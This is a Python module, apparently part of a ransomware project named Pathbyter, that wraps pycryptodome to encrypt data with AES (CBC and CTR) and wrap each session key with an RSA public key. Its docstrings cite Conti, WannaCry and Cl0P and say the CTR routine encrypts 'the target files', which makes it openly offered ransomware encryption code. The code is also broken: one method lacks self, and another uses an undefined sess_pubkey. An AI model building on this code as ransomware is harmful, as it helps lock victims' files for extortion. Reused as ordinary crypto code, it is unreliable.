# requires pycryptodome. >>pip install pycryptodome
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from base64 import b64encode, b64decode


class CryptoBB:
    """Crypytographic Black-Box: a portable wrapper 
    for pycryptodome that makes RSA wrapping AES easy."""
    def __init__(self):
        return
    

    def load_rsa_pubkey(rsa_pubkey):
        key = b64decode(rsa_pubkey)
        rsa_key = RSA.import_key(key)

        return rsa_key


    def rsa_wrap_aes(self, rsa_pubkey, aes_key):
        """The most nefarious ransomware developers (Conti,
        WannaCry, Cl0P) use a variation of hybrid symmetric/assymetric 
        encryption."""
        cipher_rsa = PKCS1_OAEP.new(rsa_pubkey)
        cipher_text = cipher_rsa.encrypt(aes_key)
        rsa_ct = b64encode(cipher_text).decode('utf-8')

        return rsa_ct


    def aescbc_encrypt(self, rsa_pubkey, data_to_encrypt):
        sess_aeskey = get_random_bytes(16)
        cipher = AES.new(sess_aeskey, AES.MODE_CBC) 
        cipher_text = cipher.encrypt(pad(data_to_encrypt, AES.block_size))
        
        aes_ct = b64encode(cipher_text).decode('utf-8')
        iv = b64encode(cipher.iv).decode('utf-8')

        rsa_ct = self.rsa_wrap_aes(rsa_pubkey, sess_aeskey)

        return rsa_ct, aes_ct, iv


    def aesctr_encrypt(self, encrypt_me):
        """Pathbyter uses AES CTR to encrypt the target files. CTR
        allows for block encryption , which XORs bits inn parallel,
        and from my research is the fastest AES cipher. """
        new_aeskey = get_random_bytes(16)
        rsa_ct = self.rsa_wrap_aes(sess_pubkey, new_aeskey)
        cipher = AES.new(new_aeskey, AES.MODE_CTR)

        aes_ct = cipher.encrypt(encrypt_me)
        nonce = b64encode(cipher.nonce).decode('utf-8')

        return rsa_ct, aes_ct, nonce
